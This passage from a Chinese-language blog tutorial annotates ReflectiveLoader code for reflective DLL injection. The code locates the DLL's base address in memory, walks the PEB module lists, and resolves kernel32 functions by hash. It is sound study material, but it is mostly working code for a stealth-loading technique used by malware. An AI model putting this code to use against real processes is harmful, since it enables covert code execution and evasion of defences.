</span><span class=c1></span><span class=n>pSectionHeader</span> <span class=o>=</span> <span class=p>(</span><span class=n>PIMAGE_SECTION_HEADER</span><span class=p>)((</span><span class=n>UINT_PTR</span><span class=p>)(</span><span class=o>&amp;</span><span class=n>pNtHeaders</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>)</span> <span class=o>+</span> <span class=n>pNtHeaders</span><span class=o>-&gt;</span><span class=n>FileHeader</span><span class=p>.</span><span class=n>SizeOfOptionalHeader</span><span class=p>);</span>
<span class=c1>// 如果需要进行RVA转化成Offset的RVA小于第一个节区的文件起始地址，就返回。因为RVA小于，那么就不可能是节区的数据，不需要转换。
</span><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=n>dwRva</span> <span class=o>&lt;</span> <span class=n>pSectionHeader</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=n>PointerToRawData</span><span class=p>)</span>
	<span class=k>return</span> <span class=n>dwRva</span><span class=p>;</span>
<span class=c1>//以上就是获取节区地址
</span><span class=c1>// 有多少节区就循环多少次
</span><span class=c1></span><span class=k>for</span> <span class=p>(</span><span class=n>wIndex</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>wIndex</span> <span class=o>&lt;</span> <span class=n>pNtHeaders</span><span class=o>-&gt;</span><span class=n>FileHeader</span><span class=p>.</span><span class=n>NumberOfSections</span><span class=p>;</span> <span class=n>wIndex</span><span class=o>++</span><span class=p>)</span>
<span class=p>{</span>
	<span class=c1>// 如果要转换的RVA大于等于该节区在内存中的起始地址(RVA),并且需要转换的RVA小于节区在内存中的起始地址加上该节区在磁盘中的大小就返回转化值
</span><span class=c1></span>	<span class=c1>// 第二个条件，是因为VirtualSize要小于SizeofRawData才能避免转换到错误节区，因此这个条件是假设该节区Image的大小等于在文件的大小，最大程度确保转换的RVA在这个节区的地址范围里面
</span><span class=c1></span>	<span class=k>if</span> <span class=p>(</span><span class=n>dwRva</span> <span class=o>&gt;=</span> <span class=n>pSectionHeader</span><span class=p>[</span><span class=n>wIndex</span><span class=p>].</span><span class=n>VirtualAddress</span> <span class=o>&amp;&amp;</span> <span class=n>dwRva</span> <span class=o>&lt;</span> <span class=p>(</span><span class=n>pSectionHeader</span><span class=p>[</span><span class=n>wIndex</span><span class=p>].</span><span class=n>VirtualAddress</span> <span class=o>+</span> <span class=n>pSectionHeader</span><span class=p>[</span><span class=n>wIndex</span><span class=p>].</span><span class=n>SizeOfRawData</span><span class=p>))</span>
	<span class=c1>// 根据计算公式 Offset = RVA - VirtualAddress + PointerToRawData
</span><span class=c1></span>		<span class=k>return</span> <span class=p>(</span><span class=n>dwRva</span> <span class=o>-</span> <span class=n>pSectionHeader</span><span class=p>[</span><span class=n>wIndex</span><span class=p>].</span><span class=n>VirtualAddress</span> <span class=o>+</span> <span class=n>pSectionHeader</span><span class=p>[</span><span class=n>wIndex</span><span class=p>].</span><span class=n>PointerToRawData</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>以上过程就实现了调用ReflectiveLoader函数，通过这个函数将DLL文件转化成Image结构存在内存中，以此来完成DLL的加载。</p>
<p>那么接下来就对ReflectiveLoader函数进行分析，探究其是如何完成DLL加载的。</p>
<p>ReflectiveLoader实现流程图:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=ReflectiveLoader.png data-srcset="/dllinjection/ReflectiveLoader.png, ReflectiveLoader.png 1.5x, /dllinjection/ReflectiveLoader.png 2x" data-sizes=auto alt=/dllinjection/ReflectiveLoader.png title=ReflectiveLoader></p>
<p>核心代码:</p>
<p>步骤1. 定位内存中的DLL基地址</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// _ReturnAddress函数内联化
</span><span class=c1>// 但如果调用比内联化效果更好，则会调用而不是内联化
</span><span class=c1></span><span class=cp>#pragma intrinsic( _ReturnAddress )
</span><span class=cp></span><span class=c1>// 函数前的__declspec(noinline)是为了避免caller函数被编译器内联优化
</span><span class=c1>// 如果内联化后返回的将是ReflectiveLoader函数的返回地址
</span><span class=c1>// 没有被内联返回的将是caller函数的返回地址
</span><span class=c1></span><span class=kr>__declspec</span><span class=p>(</span><span class=n>noinline</span><span class=p>)</span> <span class=n>ULONG_PTR</span> <span class=n>caller</span><span class=p>(</span><span class=n>VOID</span><span class=p>)</span> <span class=p>{</span> <span class=k>return</span> <span class=p>(</span><span class=n>ULONG_PTR</span><span class=p>)</span><span class=n>_ReturnAddress</span><span class=p>();</span> <span class=p>}</span>
<span class=c1>// 获得caller函数的返回地址
</span><span class=c1></span><span class=n>uiLibraryAddress</span> <span class=o>=</span> <span class=n>caller</span><span class=p>();</span>

<span class=c1>// 定位DLL文件当前所在内存空间的基地址
</span><span class=c1></span><span class=k>while</span> <span class=p>(</span><span class=n>TRUE</span><span class=p>)</span>
<span class=p>{</span>
	<span class=c1>// 如果遍历地址找到了DLL文件的基址，也就是MZ签名处
</span><span class=c1></span>	<span class=k>if</span> <span class=p>(((</span><span class=n>PIMAGE_DOS_HEADER</span><span class=p>)</span><span class=n>uiLibraryAddress</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>e_magic</span> <span class=o>==</span> <span class=n>IMAGE_DOS_SIGNATURE</span><span class=p>)</span>
	<span class=p>{</span>
		<span class=c1>// 获取DLL文件的NT头起始地址，PE签名
</span><span class=c1></span>		<span class=n>uiHeaderValue</span> <span class=o>=</span> <span class=p>((</span><span class=n>PIMAGE_DOS_HEADER</span><span class=p>)</span><span class=n>uiLibraryAddress</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>e_lfanew</span><span class=p>;</span>
		<span class=c1>// 一些x64的dll可能触发虚假的签名，因为pop r10的二进制表示为4D5A也即(MZ字符)的ASIIC编码，所以中途如果有pop r10则可能引起错误判断为MZ签名
</span><span class=c1></span>		<span class=c1>// 如果获取的NT头起始地址大于DOS头的大小，并且地址小于1024(D)=400(h)，即小于第一个节区开始的地址
</span><span class=c1></span>		<span class=k>if</span> <span class=p>(</span><span class=n>uiHeaderValue</span> <span class=o>&gt;=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>IMAGE_DOS_HEADER</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=n>uiHeaderValue</span> <span class=o>&lt;</span> <span class=mi>1024</span><span class=p>)</span>
		<span class=p>{</span>
			<span class=c1>// 如果找到了正确而不是加的MZ签名，那么此时uiHeaderValue为PE签名的RVA，而uiLibraryAddress为基址
</span><span class=c1></span>			<span class=c1>// 因此签名正确，则则满足下面的if，否则就退出，uiLibraryAddress继续减至基址
</span><span class=c1></span>			<span class=n>uiHeaderValue</span> <span class=o>+=</span> <span class=n>uiLibraryAddress</span><span class=p>;</span>
            <span class=c1>// 找到正确的PE和MZ签名后break
</span><span class=c1></span>			<span class=k>if</span> <span class=p>(((</span><span class=n>PIMAGE_NT_HEADERS</span><span class=p>)</span><span class=n>uiHeaderValue</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>Signature</span> <span class=o>==</span> <span class=n>IMAGE_NT_SIGNATURE</span><span class=p>)</span>
					<span class=k>break</span><span class=p>;</span>
			<span class=p>}</span>
		<span class=p>}</span>
		<span class=c1>// 没有找到MZ签名那就继续遍历地址
</span><span class=c1></span>		<span class=n>uiLibraryAddress</span><span class=o>--</span><span class=p>;</span>
	<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>步骤2. 获取为了加载DLL所需要的函数。共需要四个函数，其中LoadLibrary、VirtualAlloc以及GetProcAddress三个函数在Kernel32.dll中，NtFlushInstructionCache函数在ntdll.dll中</p>
<p>核心代码:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// 从PEB(进程环境块)中获取目标进程的已经加载了的DLL链
</span><span class=c1>// 在64位系统中通过GS寄存器获取TEB(线程环境块),32位系统通过FS寄存器获取TEB
</span><span class=c1>// 64位的TEB中0x60偏移数据为PEB入口地址,32为系统的TEB中0x30偏移数据为PEB入口地址
</span><span class=c1></span><span class=cp>#ifdef _WIN64
</span><span class=cp></span>	<span class=c1>// 读取GS寄存器0x60偏移的数据
</span><span class=c1></span>	<span class=n>uiBaseAddress</span> <span class=o>=</span> <span class=n>__readgsqword</span><span class=p>(</span><span class=mh>0x60</span><span class=p>);</span>
<span class=cp>#else
</span><span class=cp>#ifdef _WIN32
</span><span class=cp></span>	<span class=c1>// 读取FS寄存器0x30偏移的数据
</span><span class=c1></span>	<span class=n>uiBaseAddress</span> <span class=o>=</span> <span class=n>__readfsdword</span><span class=p>(</span><span class=mh>0x30</span><span class=p>);</span>
<span class=cp>#endif
</span><span class=cp>#endif
</span></code></pre></td></tr></table>
</div>
</div><p>这里需要插入对_PEB_LDR_DATA结构体的说明，才能明白后面的代码在干什么。可以先浏览后面的代码前面一部分，再回来看这里的知识可以更容易理解这部分内容的意义。</p>
<p>从PEB中获取的pLdr为结构体_PEB_LDR_DATA的入口地址。</p>
<p>_PEB_LDR_DATA结构体内容如下:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=k>typedef</span> <span class=k>struct</span> <span class=n>_PEB_LDR_DATA</span>
<span class=p>{</span>
	<span class=n>ULONG</span> <span class=n>Length</span><span class=p>;</span>                                 <span class=c1>// +0x00
</span><span class=c1></span>	<span class=n>BOOLEAN</span> <span class=n>Initialized</span><span class=p>;</span>                          <span class=c1>// +0x04
</span><span class=c1></span>	<span class=n>PVOID</span> <span class=n>SsHandle</span><span class=p>;</span>                               <span class=c1>// +0x08
</span><span class=c1></span>	<span class=n>LIST_ENTRY</span> <span class=n>InLoadOrderModuleList</span><span class=p>;</span>             <span class=c1>// +0x0c 按照DLL加载的顺序建立的链表
</span><span class=c1></span>	<span class=n>LIST_ENTRY</span> <span class=n>InMemoryOrderModuleList</span><span class=p>;</span>           <span class=c1>// +0x14 按照DLL在内存中的顺序建立的链表
</span><span class=c1></span>	<span class=n>LIST_ENTRY</span> <span class=n>InInitializationOrderModuleList</span><span class=p>;</span>   <span class=c1>// +0x1c 按照DLL在初始化时的顺序建立的链表
</span><span class=c1></span> <span class=p>}</span> <span class=n>PEB_LDR_DATA</span><span class=p>,</span><span class=o>*</span><span class=n>PPEB_LDR_DATA</span><span class=p>;</span>
<span class=mi>10</span> <span class=c1>// 该结构体包含了三个双向链表(_LIST_ENTRY),它们分别指向了_LDR_DATA_TABLE_ENTRY结构体。
</span></code></pre></td></tr></table>
</div>
</div><p>其中_LIST_ENTRY结构体内容如下:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=k>typedef</span> <span class=k>struct</span> <span class=n>_LIST_ENTRY</span> <span class=c1>//8字节大小
</span><span class=c1></span><span class=p>{</span>
	<span class=k>struct</span> <span class=n>_LIST_ENTRY</span> <span class=o>*</span><span class=n>Flink</span><span class=p>;</span>                    <span class=c1>// +0x00
</span><span class=c1></span>	<span class=k>struct</span> <span class=n>_LIST_ENTRY</span> <span class=o>*</span><span class=n>Blink</span><span class=p>;</span>                    <span class=c1>// +0x04
</span><span class=c1></span><span class=p>}</span> <span class=n>LIST_ENTRY</span><span class=p>,</span> <span class=o>*</span><span class=n>PLIST_ENTRY</span><span class=p>,</span> <span class=o>*</span><span class=n>RESTRICTED_POINTER</span> <span class=n>PRLIST_ENTRY</span><span class=p>;</span>
<span class=c1>// 这个双向链表指向了进程中加载的模块，结构中的每个指针，都指向了一个LDR_DATA_TABLE_ENTRY结构体。
</span></code></pre></td></tr></table>
</div>
</div><p>每一个DLL模块对应一个LDR_DATA_TABLE_ENTRY结构体，该结构体成员如下</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=k>typedef</span> <span class=k>struct</span> <span class=n>_LDR_DATA_TABLE_ENTRY</span>
<span class=p>{</span>
    <span class=n>LIST_ENTRY</span> <span class=n>InLoadOrderLinks</span><span class=p>;</span> 
    <span class=n>LIST_ENTRY</span> <span class=n>InMemoryOrderModuleList</span><span class=p>;</span>
    <span class=n>LIST_ENTRY</span> <span class=n>InInitializationOrderModuleList</span><span class=p>;</span>
    <span class=n>PVOID</span> <span class=n>DllBase</span><span class=p>;</span>                              <span class=c1>// DLLImage基址
</span><span class=c1></span>    <span class=n>PVOID</span> <span class=n>EntryPoint</span><span class=p>;</span>                           <span class=c1>// 入口点
</span><span class=c1></span>    <span class=n>ULONG</span> <span class=n>SizeOfImage</span><span class=p>;</span>                          <span class=c1>// Image大小
</span><span class=c1></span>    <span class=n>UNICODE_STRING</span> <span class=n>FullDllName</span><span class=p>;</span>                 <span class=c1>// DLL全路径字符串
</span><span class=c1></span>    <span class=n>UNICODE_STRING</span> <span class=n>BaseDllName</span><span class=p>;</span>                 <span class=c1>// DLL名称字符串
</span><span class=c1></span>    <span class=n>ULONG</span> <span class=n>Flags</span><span class=p>;</span>
    <span class=n>SHORT</span> <span class=n>LoadCount</span><span class=p>;</span>
    <span class=n>SHORT</span> <span class=n>TlsIndex</span><span class=p>;</span>
    <span class=n>LIST_ENTRY</span> <span class=n>HashTableEntry</span><span class=p>;</span>
    <span class=n>ULONG</span> <span class=n>TimeDateStamp</span><span class=p>;</span>
<span class=p>}</span><span class=n>LDR_DATA_TABLE_ENTRY</span><span class=p>,</span> <span class=o>*</span><span class=n>PLDR_DATA_TABLE_ENTRY</span><span class=p>;</span>
</code></pre></td></tr></table>
</div>
</div><p>我们通过PEB_LDR_DATA结构体中的三个双向链表遍历DLL模块时，会有一个特点，他们总是指向下一个或上一个LDR_DATA_TABLE_ENTRY结构体相同的位置。</p>
<p>例如:</p>
<p>通过PPEB_LDR_DATA->InLoadOrderModuleList遍历时，Flink指针指向上一个或Blink下一个PLDR_DATA_TABLE_ENTRY->InLoadOrderList。</p>
<p>通过PPEB_LDR_DATA->InMemoryOrderModuleList遍历时，Flink指针指向上一个或Blink下一个PLDR_DATA_TABLE_ENTRY->InMemoryOrderModuleList。</p>
<p>对于InInitialZationOrderModuleList遍历同理。</p>
<p>因此这会影响读取LDR_DATA_TABLE_ENTRY结构体中其他成员时需要取的偏移。</p>
<p>该双向链表示意图如下图所示:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=PEB_LDR_DATA%e5%8f%8c%e5%90%91%e9%93%be%e8%a1%a8%e7%a4%ba%e6%84%8f%e5%9b%be.png data-srcset="/dllinjection/PEB_LDR_DATA%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8%E7%A4%BA%E6%84%8F%E5%9B%BE.png, PEB_LDR_DATA%e5%8f%8c%e5%90%91%e9%93%be%e8%a1%a8%e7%a4%ba%e6%84%8f%e5%9b%be.png 1.5x, /dllinjection/PEB_LDR_DATA%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8%E7%A4%BA%E6%84%8F%E5%9B%BE.png 2x" data-sizes=auto alt=/dllinjection/PEB_LDR_DATA%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8%E7%A4%BA%E6%84%8F%E5%9B%BE.png title=PEB_LDR_DATA双向链表示意图></p>
<p>图中只画了InLoadOrderModuleList和InMemoryOrderModuleList的链表表现形式，但是InInitialZationOrderModuleList也是相同的。虽然图中画的InLoadOrderModuleList和InMemoryOrderModuleList两个链表顺序一致，但实际中链表的连接结构体顺序并不一定相同。这里只是示意图。</p>
<p>当我们弄明白DLL链后，再次回到核心代码进行分析，从DLL获取目标函数这一部分内容可以结合上述的内容进行理解。</p>
<p>核心代码(接上):</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// 获取目标进程加载的DLL链
</span><span class=c1></span><span class=n>uiBaseAddress</span> <span class=o>=</span> <span class=p>(</span><span class=n>ULONG_PTR</span><span class=p>)((</span><span class=n>_PPEB</span><span class=p>)</span><span class=n>uiBaseAddress</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>pLdr</span><span class=p>;</span>
<span class=c1>// DLL链是一个双向链表
</span><span class=c1>// 获取InMemoryOrderList 链表的第一个存储着DLL信息结构体的入口地址
</span><span class=c1></span><span class=n>uiValueA</span> <span class=o>=</span> <span class=p>(</span><span class=n>ULONG_PTR</span><span class=p>)((</span><span class=n>PPEB_LDR_DATA</span><span class=p>)</span><span class=n>uiBaseAddress</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>InMemoryOrderModuleList</span><span class=p>.</span><span class=n>Flink</span><span class=p>;</span>
<span class=k>while</span> <span class=p>(</span><span class=n>uiValueA</span><span class=p>)</span>
<span class=p>{</span>
	<span class=c1>// 这里的PEB_LDR_DATA结构体注释掉了第一个成员，那为什么BaseDllName还是原地址而不是前一个成员的变量呢？
</span><span class=c1></span>	<span class=c1>// 难道转换类型后不应该自动 的把结构体第一个成员保存着起始地址的数据吗，也就是InMemoryOrderModule的成员存的是InLoadLinks的数据
</span><span class=c1></span>	<span class=c1>// 解释是是因为字节对称，因此还是会保持原来的对应结构。也就是因为前面说的链表特性导致，我们通过InMemoryOrderList遍历时仍然会指向上一个或下一个DLL信息结构体的InMemoryOrderList。
</span><span class=c1></span>	<span class=c1>// 获取当前DLL的名称
</span><span class=c1></span>	<span class=n>uiValueB</span> <span class=o>=</span> <span class=p>(</span><span class=n>ULONG_PTR</span><span class=p>)((</span><span class=n>PLDR_DATA_TABLE_ENTRY</span><span class=p>)</span><span class=n>uiValueA</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>BaseDllName</span><span class=p>.</span><span class=n>pBuffer</span><span class=p>;</span>
	<span class=c1>// 获取DLL名称的长度
</span><span class=c1></span>	<span class=n>usCounter</span> <span class=o>=</span> <span class=p>((</span><span class=n>PLDR_DATA_TABLE_ENTRY</span><span class=p>)</span><span class=n>uiValueA</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>BaseDllName</span><span class=p>.</span><span class=n>Length</span><span class=p>;</span>
	<span class=c1>// DLL计算出的Hash值保存在uiValueC中
</span><span class=c1></span>	<span class=n>uiValueC</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
	<span class=c1>// 计算DLL的Hash，下面的do-while就在进行Hash值的计算
</span><span class=c1></span>	<span class=k>do</span>
	<span class=p>{</span>
		<span class=c1>// 将uiValueC循环右移13位，是循环右移所以不会丢失数据
</span><span class=c1></span>		<span class=n>uiValueC</span> <span class=o>=</span> <span class=n>ror</span><span class=p>((</span><span class=n>DWORD</span><span class=p>)</span><span class=n>uiValueC</span><span class=p>);</span>
		<span class=c1>// 把DLL名中的小写字母变大写，然后用uiValueC加上变化后的十六字节数据
</span><span class=c1></span>		<span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=p>((</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=n>uiValueB</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=sc>&#39;a&#39;</span><span class=p>)</span>
				<span class=n>uiValueC</span> <span class=o>+=</span> <span class=o>*</span><span class=p>((</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=n>uiValueB</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x20</span><span class=p>;</span>
			<span class=k>else</span>
				<span class=n>uiValueC</span> <span class=o>+=</span> <span class=o>*</span><span class=p>((</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=n>uiValueB</span><span class=p>);</span>
        	<span class=c1>// 移动到DLL名称的下一个字母
</span><span class=c1></span>			<span class=n>uiValueB</span><span class=o>++</span><span class=p>;</span>
		<span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=o>--</span><span class=n>usCounter</span><span class=p>);</span>
	<span class=c1>// 如果该DLL的Hash值与KERNEL32.DLL的相同
</span><span class=c1></span>	<span class=k>if</span> <span class=p>((</span><span class=n>DWORD</span><span class=p>)</span><span class=n>uiValueC</span> <span class=o>==</span> <span class=n>KERNEL32DLL_HASH</span><span class=p>)</span>
	<span class=p>{</span>
		<span class=c1>// 获取DLL的基址
</span><span class=c1></span>		<span class=n>uiBaseAddress</span> <span class=o>=</span> <span class=p>(</span><span class=n>ULONG_PTR</span><span class=p>)((</span><span class=n>PLDR_DATA_TABLE_ENTRY</span><span class=p>)</span><span class=n>uiValueA</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>DllBase</span><span class=p>;</span>
		<span class=c1>// 获取DLL的NT头
</span><span class=c1></span>		<span class=n>uiExportDir</span> <span class=o>=</span> <span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_DOS_HEADER</span><span class=p>)</span><span class=n>uiBaseAddress</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>e_lfanew</span><span class=p>;</span>
		<span class=c1>// 获取DLL的导出表入口地址
</span><span class=c1></span>		<span class=n>uiNameArray</span> <span class=o>=</span> <span class=p>(</span><span class=n>ULONG_PTR</span><span class=p>)</span> <span class=o>&amp;</span> <span class=p>((</span><span class=n>PIMAGE_NT_HEADERS</span><span class=p>)</span><span class=n>uiExportDir</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>DataDirectory</span><span class=p>[</span><span class=n>IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class=p>];</span>
		<span class=c1>// 获取导出表的VA
</span><span class=c1></span>		<span class=n>uiExportDir</span> <span class=o>=</span> <span class=p>(</span><span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_DATA_DIRECTORY</span><span class=p>)</span><span class=n>uiNameArray</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>VirtualAddress</span><span class=p>);</span>
		<span class=c1>// 获取导出函数名称数组的起始地址
</span><span class=c1></span>		<span class=n>uiNameArray</span> <span class=o>=</span> <span class=p>(</span><span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_EXPORT_DIRECTORY</span><span class=p>)</span><span class=n>uiExportDir</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>AddressOfNames</span><span class=p>);</span>
		<span class=c1>// 获取导出函数Ordinals数组的起始地址
</span><span class=c1></span>		<span class=n>uiNameOrdinals</span> <span class=o>=</span> <span class=p>(</span><span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_EXPORT_DIRECTORY</span><span class=p>)</span><span class=n>uiExportDir</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>AddressOfNameOrdinals</span><span class=p>);</span>
			<span class=c1>// 这个3的是我们在KERNEL32.DLL中需要的函数的数量
</span><span class=c1></span>		<span class=n>usCounter</span> <span class=o>=</span> <span class=mi>3</span><span class=p>;</span>
		<span class=k>while</span> <span class=p>(</span><span class=n>usCounter</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span>
		<span class=p>{</span>
			<span class=c1>// 计算函数名字符串的地址的Hash值
</span><span class=c1></span>			<span class=n>dwHashValue</span> <span class=o>=</span> <span class=n>hash</span><span class=p>((</span><span class=kt>char</span><span class=o>*</span><span class=p>)(</span><span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=n>DEREF_32</span><span class=p>(</span><span class=n>uiNameArray</span><span class=p>)));</span>
			<span class=c1>// 如果找到了我们需要的函数，那么就获取他们的VA
</span><span class=c1></span>			<span class=c1>// 需要的函数有LoadLibraryA,GetProcAddress,VirtualAlloc
</span><span class=c1></span>			<span class=k>if</span> <span class=p>(</span><span class=n>dwHashValue</span> <span class=o>==</span> <span class=n>LOADLIBRARYA_HASH</span> <span class=o>||</span> <span class=n>dwHashValue</span> <span class=o>==</span> <span class=n>GETPROCADDRESS_HASH</span> <span class=o>||</span> <span class=n>dwHashValue</span> <span class=o>==</span> <span class=n>VIRTUALALLOC_HASH</span><span class=p>)</span>
			<span class=p>{</span>
				<span class=c1>// 获得导出函数地址数组的地址
</span><span class=c1></span>				<span class=n>uiAddressArray</span> <span class=o>=</span> <span class=p>(</span><span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_EXPORT_DIRECTORY</span><span class=p>)</span><span class=n>uiExportDir</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>AddressOfFunctions</span><span class=p>);</span>
				<span class=c1>// 使用ordinal作为索引获取所需函数的地址
</span><span class=c1></span>				<span class=n>uiAddressArray</span> <span class=o>+=</span> <span class=p>(</span><span class=n>DEREF_16</span><span class=p>(</span><span class=n>uiNameOrdinals</span><span class=p>)</span> <span class=o>*</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>DWORD</span><span class=p>));</span>
				<span class=c1>// 保存所需函数的虚拟地址
</span><span class=c1></span>				<span class=k>if</span> <span class=p>(</span><span class=n>dwHashValue</span> <span class=o>==</span> <span class=n>LOADLIBRARYA_HASH</span><span class=p>)</span>
					<span class=n>pLoadLibraryA</span> <span class=o>=</span> <span class=p>(</span><span class=n>LOADLIBRARYA</span><span class=p>)(</span><span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=n>DEREF_32</span><span class=p>(</span><span class=n>uiAddressArray</span><span class=p>));</span>
